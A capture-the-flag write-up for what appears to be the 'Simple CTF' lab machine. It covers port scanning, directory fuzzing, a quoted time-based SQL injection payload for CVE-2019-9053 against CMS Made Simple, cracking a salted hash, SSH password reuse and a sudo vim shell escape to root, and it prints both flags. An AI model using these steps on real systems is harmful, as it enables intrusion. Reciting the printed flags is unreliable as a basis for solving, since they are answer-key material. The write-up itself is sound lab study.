# Simple CTF

![image.png](images/image.png)

## Port Scan

To begin, we can first take a look at the first 1000 ports. We can see port `21` (FTP) and port `80` (HTTP) is opened

```bash
└─$ rustscan -a xx.xx.xxx.xxx --ulimit 5000 -r1-1000 -- -A                                                                                                                                                                                 
...
[~] Automatically increasing ulimit value to 5000.
Open xx.xx.xxx.xxx:21
Open xx.xx.xxx.xxx:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A" on ip xx.xx.xxx.xxx
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.178.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
...

```

Do a full port scan, and we can find that port `2222` is also open. It is EnterNetIP-1, an alternative port for `SSH`

```bash
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 62
80/tcp   open  http         syn-ack ttl 62
2222/tcp open  EtherNetIP-1 syn-ack ttl 62

```

I searched up on the Internet about [opening SSH in port 2222](https://lobste.rs/s/jj8cx9/why_putting_ssh_on_another_port_than_22_is), which seems to be less secure

## HTTP (Port 80)

Access to port `80`, and we can confirm that it is running Apache in Ubuntu, as suggested in the RustScan result.

![image.png](images/image%201.png)

In the above RustScan result, we can see there is a `robots.txt` entry. If we go there, we will see  `/openemr-5_0_1_3` is disallowed.

```bash
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /

Disallow: /openemr-5_0_1_3/
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

However it is just a rabbit hole

```bash
└─$ curl http://xx.xx.xxx.xxx/openemr-5_0_1_3
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /openemr-5_0_1_3 was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at xx.xx.xxx.xxx Port 80</address>
</body></html>

```

### CMS

To continue, I decided to enumerate the website using FFUF and found a `/simple` endpoint

```bash
└─$ ffuf -u http://xx.xx.xxx.xxx/FUZZ -w /usr/share/wordlists/dirb/common.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://xx.xx.xxx.xxx/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 105ms]
.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 106ms]
                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 106ms]
.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 106ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 103ms]
robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33, Duration: 99ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 101ms]
simple                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 109ms]
:: Progress: [4614/4614] :: Job [1/1] :: 397 req/sec :: Duration: [0:00:15] :: Errors: 0 ::

```

Go to the `/simple` endpoint, and we will see it is running CMS Make Simple version 2.2.8

![image.png](images/image%202.png)

We can try to search for exploits for this specific version, and we found an `SQLI` exploit

```bash
─$ searchsploit CMS Made Simple 2.2.8                                                                                                                                                                                             
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                                                                                                 | php/webapps/46635.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -------------------------
```

We can then use the `-m` flag to mirror the exploit. The full command will be `searchsploit -m php/webapps/46635.py`

Reading the comments, we know it is related to `CVE-2019-9053`, and this exploit uses this CVE to launch time-based SQLi.

In the exploit, `TIME` is set to b1, and the SQLi uses `sleep()` to check each character one at a time

```bash
        for i in range(0, len(dictionary)):
            temp_salt = salt + dictionary[i]
            ord_salt_temp = ord_salt + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_salt)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
```

The exploit itself provides three options: `-u` for the URL, `-w` for the wordlist, and `-c` for cracking the password

```bash
parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
parser.add_option('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
parser.add_option('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)
```

We can try to launch the script without any parameters, but instead of complaining that we haven’t specified a URL, it complains about a syntax error

```bash
└─$ python 46635.py                                                                                                                                                                                                                        
    print "[+] Specify an url target"
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
```

It seems that it is about Python 2 syntax. To fix this, we can first convert it to a Python 3 format using `python3 -m fissix -w 46635.py`

Then we can launch the exploit. I didn’t use the `-c` and `-w` flags because they would result in errors.

```bash
python3 46635.py -u http://xx.xx.xxx.xxx/simple
....
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
```

Place that hash into [Hashes.com](https://hashes.com/en/decrypt/hash), we can get `1dac0d92e9fa6bb2secret`

![image.png](images/image%203.png)

Because `1dac0d92e9fa6bb2` is just the salt, we know the password is just `secret`

We can then test the credentials (`mitch:secret`) under `/simple/admin/login.php`

![image.png](images/image%204.png)

We can successfully enter the admin panel

![image.png](images/image%205.png)

However there are not anything special within the admin panel

## SSH (Port 2222)

To continue, I tried using the same credentials in `SSH` because it is not uncommon to reuse passwords. It turns out it works, and we can log in as mitch.

Then we can obtain the user flag which is `G00d j0b, keep up!` 

```bash
└─$ ssh mitch@xx.xx.xxx.xxx -p2222
...
mitch@xx.xx.xxx.xxx's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```

## Privilege Escalation

Once we gain a foothold, we can learn more about the machine. We can see there is another use called `sunbath`, which might be useful for lateral movement

```bash
$ cd /home
$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 aug 17  2019 .
drwxr-xr-x 23 root    root    4096 aug 19  2019 ..
drwxr-x---  3 mitch   mitch   4096 aug 19  2019 mitch
drwxr-x--- 16 sunbath sunbath 4096 aug 19  2019 sunbath

```

Then I check which commands we can run with `sudo`. By running `sudo -l`, we know that we can run `vim` with `sudo` privileges

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```

By running `sudo vim /root/root.txt`, we can view the root flag.
Alternatively, we can actually [open up a terminal in vim](https://askubuntu.com/questions/496822/access-to-the-terminal-while-you-are-on-vim)

To do that, we first run `sudo vim`, then use `:!sh` to launch a terminal

![image.png](images/image%206.png)

Finally, we can see that we became root, and we can read the root flag

```bash
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root 
root.txt
# cat /root/root.txt
W3ll d0n3. You made it!
```

User Flag: `G00d j0b, keep up!` 
Root Flag: `W3ll d0n3. You made it!`
